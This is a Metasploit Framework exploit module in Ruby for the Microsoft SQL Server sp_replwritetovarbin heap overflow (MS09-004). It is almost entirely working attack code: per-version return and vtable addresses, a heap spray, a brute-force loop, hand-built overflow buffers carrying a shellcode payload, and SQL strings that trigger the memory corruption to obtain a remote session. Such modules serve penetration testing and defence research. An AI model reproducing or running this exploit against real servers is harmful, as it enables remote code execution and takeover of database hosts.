##
# $Id: ms09_004_sp_replwritetovarbin.rb 8068 2010-01-05 00:02:15Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::MSSQL

	def initialize(info = {})

		super(update_info(info,
			'Name'           => 'Microsoft SQL Server sp_replwritetovarbin Memory Corruption',
			'Description'    => %q{
					A heap-based buffer overflow can occur when calling the undocumented 
				"sp_replwritetovarbin" extended stored procedure. This vulnerability affects
				all versions of Microsoft SQL Server 2000 and 2005, Windows Internal Database,
				and Microsoft Desktop Engine (MSDE) without the updates supplied in MS09-004.

				This exploit smashes several pointers, as shown below.

				1. pointer to a 32-bit value that is set to 0
				2. pointer to a 32-bit value that is set to a length influcenced by the buffer
				  length.
				3. pointer to a 32-bit value that is used as a vtable pointer. In MSSQL 2000,
				  this value is referenced with a displacement of 0x38. For MSSQL 2005, the
				  displacement is 0x10. The address of our buffer is conveniently stored in
				  ecx when this instruction is executed.
				4. On MSSQL 2005, an additional vtable ptr is smashed, which is referenced with
				  a displacement of 4. This pointer is not used by this exploit.

				There are two different methods used by this exploit, which have been named 
				"writeNcall" and "sprayNbrute".

				The first, "writeNcall", was published by k`sOSe on Dec 17 2008. It uses pointers
				2 and 3, as well as a writeable address. This method is quite reliable. However,
				it relies on the the operation on pointer 2. Newer versions of SQL server
				(>= 2000 SP3 at least) use a length value that is 8-byte aligned. This imposes a
				restriction that the code address that leads to the payload (jmp ecx in this 
				case) must match the regex '.[08].[08].[08].[08]'. Unfortunately, no such 
				addresses were found in memory.

				For this reason, the second method, "sprayNbrute" is used. First a heap-spray
				is used to prime memory with lots of copies of the address of our code that 
				leads to the payload (jmp ecx).  Next, brute force is used to try to guess a 
				value for pointer 3 that points to the sprayed data.
				
				A new method of spraying the heap inside MSSQL is presented. Sadly, it only 
				allows the creation of a bunch of 8000 byte buffers.
			},
			'Author'         => [ 'jduck' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 8068 $',
			'References'     =>
				[
					[ 'OSVDB', '50589' ],
					[ 'CVE', '2008-5416' ],
					[ 'BID', '32710' ],
					[ 'MSB', 'MS09-004' ],
					[ 'URL', 'http://www.milw0rm.com/exploits/7501' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'seh',
				},
			'Payload'        =>
				{
					'Space'    => 512,
					'BadChars' => "", # nul bytes are ok!
					'StackAdjustment' => -3500,
					'DisableNops' => true
				},
			'Platform'       => 'win',
			'Privileged'     => true,
			'Targets'        =>
				[
					# auto targeting!
					[ 'Automatic', { } ],

					#
					# Individual targets
					#
					[
						# Microsoft SQL Server  2000 - 8.00.194 (Intel X86)
						# Aug  6 2000 00:57:48
						'MSSQL 2000 / MSDE SP0 (8.00.194)',
						{
							'Method'   => 'writeNcall',
							'Writable' => 0x42b6cfe0,  # any writable addr (not even necessary really)
							'Vtable'   => 0x1b0768c8,  # becomes eax for [eax+0x38] (must be valid to exec)
							'Ret'      => 0x42b6be7b   # jmp ecx in sqlsort.dll (2000 base)
						},
					],
					[
						# Microsoft SQL Server  2000 - 8.00.760 (Intel X86)
						# Dec 17 2002 14:22:05
						'MSSQL 2000 / MSDE SP3 (8.00.760)',
						{
							'Method'   => 'sprayNbrute',
							'Writable' => 0x42b6cfe0,  # any writable addr (not even necessary really)
							'Vtable'   => 0x1b0768c8,  # becomes eax for [eax+0x38] (must be valid to exec)
							'Ret'      => 0x42b6be7b   # jmp ecx in sqlsort.dll (2000 sp3)
						},
					],
					[
						# Microsoft SQL Server  2000 - 8.00.2039 (Intel X86)
						# May  3 2005 23:18:38
						'MSSQL 2000 / MSDE SP4 (8.00.2039)',
						{
							'Method'   => 'sprayNbrute',
							'Writable' => 0x42b6cfe0,  # any writable addr (not even necessary really)
							#'Vtable'   => 0x1b0768c8,  # becomes eax for [eax+0x38] (must be valid to exec)
							#'Vtable'   => 0x42c300c8,  # ugh!
							'Ret'      => 0x42b0be10   # jmp ecx in sqlsort.dll (2000 sp4)
							#'Ret'      => 0x773d115b   # jmp ecx in activeds.dll (2000 sp4 on 2000)
							#'Ret'      => 0x7ca7dc96   # push ecx|pop esp|pop ebp|retn 8 - in shell32 on 2k3sp2
						},
					],
					[
						# Microsoft SQL Server 2005 - 9.00.1399.06 (Intel X86)
						# Oct 14 2005 00:33:37
						'MSSQL 2005 (9.00.1399.06)',
						{
							'Method'   => 'sprayNbrute',
							'Writable' => 0x53ad5330,  # any writable addr (not even necessary really)
							'Vtable'   => 0x05413090,  # becomes edx for [edx+0x10] or [edx+4] (must be valid to exec)
							'Ret'      => 0x49a9835f   # jmp ecx ?
						},
					],
					[
						# debugging...
						'CRASHER',
						{
							'Method'   => 'sprayNbrute',
							'Writable' => 0xcafebabe,
							'Vtable'   => 0xfeedfed5,
							'Ret'      => 0xdeadbeef
						},
					]
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Dec 09 2008'
			))
	end

	def check
		# the ping to port 1434 method has two drawbacks...
		# #1, it doesn't work on mssql 2005 or newer (localhost only listening)
		# #2, it doesn't give an accurate version number (sp/os)

		# since we need to have credentials for this vuln, we just login and run a query
		# to get the version information
		version = mssql_query_version
		if not version
			return Exploit::CheckCode::Detected
		end
		print_status("@@version returned:\n\t" + version)

		# TODO: add more versions
		return Exploit::CheckCode::Vulnerable if (version =~ /8\.00\.194/)
		return Exploit::CheckCode::Vulnerable if (version =~ /8\.00\.760/)
		return Exploit::CheckCode::Vulnerable if (version =~ /8\.00\.2039/)
		return Exploit::CheckCode::Vulnerable if (version =~ /9\.00\.1399\.06/)
		return Exploit::CheckCode::Safe
	end

	def exploit

		mytarget = nil
		if target.name =~ /Automatic/
			print_status("Attempting automatic target detection...")

			version = mssql_query_version
			raise RuntimError, "Unable to get version!" if not version

			if (version =~ /8\.00\.194/)
				mytarget = targets[1]
			elsif (version =~ /8\.00\.760/)
				mytarget = targets[2]
			elsif (version =~ /8\.00\.2039/)
				mytarget = targets[3]
			elsif (version =~ /9\.00\./)
				mytarget = targets[4]
			end

			if mytarget.nil?
				raise RuntimeError, "Unable to automatically detect the target"
			else
				print_status("Automatically detected target \"#{mytarget.name}\"")
			end
		else
			mytarget = target
		end

		if mytarget['Method'] == 'sprayNbrute'
			exploit_spray_and_brute(mytarget)
		elsif mytarget['Method'] == 'writeNcall'
			exploit_write_and_call(mytarget)
		else
			raise RuntimeError, "Invalid exploitation method specified."
		end
	end


	# prepare a known address pointing to jmp ecx!
	def exploit_write_and_call(mytarget)

		# write the 4 bytes..
		packed_ret = [mytarget['Ret']].pack('V')
		x = 0
		packed_ret.unpack('C*').each do |byte|
			if (not mssql_login_datastore)
				raise RuntimeError, "Invalid SQL Server credentials"
			end

			addr = mytarget['Writable'] + x

			# write a single byte value to an arbitrary address (using this vuln)
			print_status("Writing 0x%02x to %#x ..." % [byte, addr])

			num = 16
			sz = num + 179
			buf = rand_text_alphanumeric(sz)
			# this corresponds to mov [eax+4], ecx
			buf << [addr - 4].pack('V')

			# this causes a length value to have the lsb of our byte
			len = 0x169
			if (len & 0xff) < byte
				len = byte - (len & 0xff)
			else
				len = (0x200 - len) + byte
			end
			extra = rand_text_alphanumeric(len)

			write_byte_sql = %Q|declare @e int,@b varbinary,@l int;exec master.dbo.sp_replwritetovarbin %NUM%,@e out,@b out,@l out,'%STUFF%','','','','','','','','','%EXTRA%'|
			buf = mssql_encode_string(buf)
			sql = write_byte_sql.gsub(/%NUM%/, num.to_s).gsub(/%STUFF%/, buf).gsub(/%EXTRA%/, extra)
			begin
				ret = mssql_query(sql, false)
			rescue ::Errno::ECONNRESET, EOFError
				print_error("Error: #{$!}")
			end

			x += 1
		end

		if (not mssql_login_datastore)
			raise RuntimeError, "Invalid SQL Server credentials"
		end

		# call to ecx via the ptr we wrote
		print_status("Triggering the call to our faked vtable ptr @ %#x" % mytarget['Writable'])
		sqlquery = %Q|declare @i int,@buf nvarchar(4000)
set @buf='declare @e int,@b varbinary,@l int;'
set @buf=@buf+'exec master.dbo.sp_replwritetovarbin %NUM%,@e out,@b out,@l out,''%STUFF%'','''
set @buf=@buf+'1'',''2'',''3'',''4'',''5'',''6'',''7'',''8'''
exec master..sp_executesql @buf
|
		# make sploit buff
		num = 16
		sz = num + 179
		sploit = make_nops(sz-2)
		sploit << "\xeb\x04"
		sploit << [mytarget['Writable'] + 8].pack('V')
		sploit << payload.encoded
		sploit[3,4] = [mytarget['Writable']-0x38].pack('V')

		# encode chars that get modified
		enc = mssql_encode_string(sploit)
		sql = sqlquery.gsub(/%NUM%/, num.to_s).gsub(/%STUFF%/, enc)
		ret = mssql_query(sql)

		handler
		disconnect
	end


	def exploit_spray_and_brute(mytarget)

		brute_count = 1000
		brute_step = 4096
		spray = true
		spray = false if mytarget.opts.has_key?('nospray')

		if spray

			if (not mssql_login_datastore)
				raise RuntimeError, "Invalid SQL Server credentials"
			end

			print_status("Spraying the heap with our vtable entry pointer of %#x" % mytarget['Ret'])

			# spray the heap! (count of 'max' blocks of 8000 bytes...)
			query2 = "declare @s varchar(8000);set @s='%MARKER%'+REPLICATE(%ADDR%, (8000/4)-3)+'%MARKER%'+%ADDR%;select @s"
			query = %Q|declare @s nvarchar(4000);set @s='%QUERY2%';exec master..sp_executesql @s|

			addr = mssql_str_to_chars([mytarget['Ret']].pack('V'))
=begin
			search_cmd = "s -b 0 L?-1 41 41"
			search_cmd << Rex::Text.to_hex([mytarget['Ret']].pack('V'), ' ')
			print_status("search command: " + search_cmd)
=end
			max = 1000
			part = max / 10
			part = 1 if part < 1
			max.times do |x|
				print_status("Spraying ... %d / %d" % [x,max]) if ((x % part)==0)

				marker = [0x41414141 + x].pack('V')

				q2run = query2.gsub(/%MARKER%/, marker)
				q2run.gsub!(/%ADDR%/, addr)
				q2run.gsub!(/\'/, "\'\'")
				runme = query.gsub(/%QUERY2%/, q2run)

				break if not mssql_query(runme)
			end

			disconnect
	   end

		sqlquery = %Q|declare @i int,@buf nvarchar(4000)
set @buf='declare @e int,@b varbinary,@l int;'
set @buf=@buf+'exec master.dbo.sp_replwritetovarbin %NUM%,@e out,@b out,@l out,''%STUFF%'','''
set @buf=@buf+'1'',''2'',''3'',''4'',''5'',''6'',''7'',''8'''
exec master..sp_executesql @buf
|

		# trigger the memory corruption
		brute_count.times do |x|
			vtable = mytarget['Vtable'] + (x * brute_step)

			# make sploit buff
			num = 16
			sz = num + 179
			sploit = make_nops(sz-2)
			#sploit = "\x90" * (sz-2)
			sploit << "\xeb\x04"
			sploit << [mytarget['Writable'] + 8].pack('V')
			sploit << payload.encoded

			# mssql 2000 vtable ptr smashed!
			sploit[num-13,4] = [vtable-0x38].pack('V')

			# mssql 2005 stuff:
			# the vtable is deref'd twice here
			# - first time ecx points at our buffer and the offset is 0x10
			# - second time esp+8 points to our buffer and the offset is 0x04
			sploit[num+63,4] = [vtable-0x10].pack('V')
			#sploit[num+407,4] = [vtable-0x4].pack('V')

			# encode chars that get modified
			enc = mssql_encode_string(sploit)

			# put the number in (start offset)
			runme = sqlquery.gsub(/%NUM%/, num.to_s)
			runme.gsub!(/%STUFF%/, enc)

			print_status("Triggering the call to our faked vtable ptr @ %#x" % vtable)

			# go!
			if (not mssql_login_datastore)
				raise RuntimeError, "Unable to log in!"
			end
			begin
				mssql_query(runme)
			rescue ::Errno::ECONNRESET, EOFError
				print_error("Error: #{$!}")
			end

			handler
			break if session_created?

			disconnect
		end
	end


	def mssql_str_to_chars(str)
		ret = ""
		str.unpack('C*').each do |ch|
			ret += "+" if ret.length > 0
			ret += "char("
			ret << ch.to_s
			ret += ")"
		end
		return ret
	end


	def mssql_encode_string(str)
		badchars = "\x00\x80\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8e\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9e\x9f"

		enc = ""
		in_str = true
		str.unpack('C*').each do |ch|
			# double-double single quotes
			if ch == 0x27
				if not in_str
					enc << "+'"
					in_str = true
				end
				enc << ch.chr * 4
				next
			end

			# double backslashes
			if ch == 0x5c
				if not in_str
					enc << "+'"
					in_str = true
				end
				enc << ch.chr * 2
				next
			end

			# convert any bad stuff to char(0xXX)
			if ((idx = badchars.index(ch.chr)))
				enc << "'" if in_str
				enc << "+char(0x%x)" % ch
				in_str = false
			else
				enc << "+'" if not in_str
				enc << ch.chr
				in_str = true
			end
		end
		enc << "+'" if not in_str
		return enc
	end


	def mssql_query_version
		if (not mssql_login_datastore)
			raise RuntimeError, "Invalid SQL Server credentials"
		end
		res = mssql_query("select @@version")
		disconnect

		return nil if not res
		if res[:errors] and not res[:errors].empty?
			errstr = ""
			res[:errors].each do |err|
				errstr << err
			end
			raise RuntimeError, errstr
		end

		if not res[:rows] or res[:rows].empty?
			return nil
		end

		return res[:rows][0][0]
	end

end